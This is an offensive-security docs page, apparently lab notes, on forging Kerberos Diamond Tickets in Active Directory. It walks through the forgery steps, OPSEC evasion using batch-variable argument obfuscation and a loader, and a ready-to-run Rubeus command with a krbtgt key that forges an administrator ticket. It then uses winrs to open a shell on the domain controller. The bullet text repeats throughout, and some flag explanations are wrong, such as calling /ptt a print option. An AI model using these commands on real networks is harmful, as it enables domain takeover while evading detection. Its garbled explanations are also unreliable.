---
title: Diamond Ticket
layout: docs
---

Diamond tickets are a variant of forged Kerberos tickets that can be used to gain privileged access to services in an Active Directory domain in a stealthy manner. 

The main differences between Silver and Diamond tickets are:

- Silver tickets are used to gain access to specific services by forging a service ticket using the target service account's key, while Diamond tickets are used to forge a ticket granting ticket (TGT) which can then be used to request service tickets for any service.

- Diamond tickets are more stealthy than Silver tickets because they request a legitimate TGT from a domain controller first, decrypt it, modify the PAC, and re-encrypt it. This produces a PAC that is highly similar to a legitimate one and generates legitimate requests, making it harder to detect.

Here are the steps to forge a Diamond Ticket:

1. Obtain the AES256 key of the krbtgt account:
  - This requires compromising a domain controller or having access to the domain controller's memory.
  - The AES256 key is used to decrypt and re-encrypt the ticket.

- This requires compromising a domain controller or having access to the domain controller's memory.

- The AES256 key is used to decrypt and re-encrypt the ticket.

2. Request a legitimate TGT:
  - Use Rubeus (on Windows) or Impacket'sticketer.py(on Unix-like systems) to request a legitimate TGT for a low-privileged user.
  - This step is necessary to obtain a ticket that can be modified to grant elevated privileges.

- Use Rubeus (on Windows) or Impacket's ticketer.py (on Unix-like systems) to request a legitimate TGT for a low-privileged user.

- This step is necessary to obtain a ticket that can be modified to grant elevated privileges.

3. Decrypt the TGT:
  - Use the AES256 key to decrypt the TGT.

- Use the AES256 key to decrypt the TGT.

4. Modify the PAC:
  - Modify the PAC to include the desired user ID and group IDs.
  - This step allows you to grant additional privileges beyond what a standard Golden Ticket offers.

- Modify the PAC to include the desired user ID and group IDs.

- This step allows you to grant additional privileges beyond what a standard Golden Ticket offers.

5. Recalculate the signatures:
  - Recalculate the signatures to ensure the ticket remains valid.

- Recalculate the signatures to ensure the ticket remains valid.

6. Re-encrypt the ticket:
  - Re-encrypt the ticket using the AES256 key.

- Re-encrypt the ticket using the AES256 key.

7. Use the Diamond Ticket:
  - Use the resulting Diamond Ticket to request service tickets for any service in the domain, effectively granting you elevated privileges.

- Use the resulting Diamond Ticket to request service tickets for any service in the domain, effectively granting you elevated privileges.

Some OPSEC advantages of Diamond tickets over Golden tickets include:

- Requesting a valid TGT first makes it less likely to trigger detection that monitor for service ticket requests without a corresponding TGT request.

- The ticket times are more likely to be correct by default since the ticket is first created by a domain controller.

To abuse a Diamond Ticket, you do not necessarily need to be a Domain Admin privileged user. However, you do need to have access to the AES256 key of the KRBTGT account, which is typically only accessible to Domain Admins or those who have compromised a domain controller.

# Diamond Ticket With Rubeus

For this demonstration, I’ll be using Rubeus commands. I’ll also be focus on OPSEC care by using PELoader.exe and ArgSplit.exe to encode the arguments.

Executing ArgSplit.bat for argument encode and copy/paste the result to CMD.

`diamond`

```Bash
set "z=d"
set "y=n"
set "x=o"
set "w=m"
set "v=a"
set "u=i"
set "t=d"
set "Pwn=%t%%u%%v%%w%%x%%y%%z%"
```

`C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`

- -path: Specifies the path to the Rubeus executable.

- -args: Specifies the arguments to be passed to the Rubeus executable.

- /krbkey: Specifies the KRBTGT key.

- /tgtdeleg: Specifies the target delegation.

- /enctype: Specifies the encryption type.

- /ticketuser: Specifies the user for the ticket.

- /domain: Specifies the domain.

- /dc: Specifies the domain controller.

- /ticketuserid: Specifies the user ID for the ticket.

- /groups: Specifies the groups.

- /createnetonly: Specifies the network-only creation of the ticket.

- /show: Displays the ticket.

- /ptt: Prints the ticket to the console

As we can we were able to forge a Diamond Ticket and we can use it by accessing Domain Controller with `WinRS`.

`winrs -r:dcordp-dc cmd`

Diamond Tickets are really straightforward and we can see that if we do have all proper information for the attack we get a new session as Domain Admin.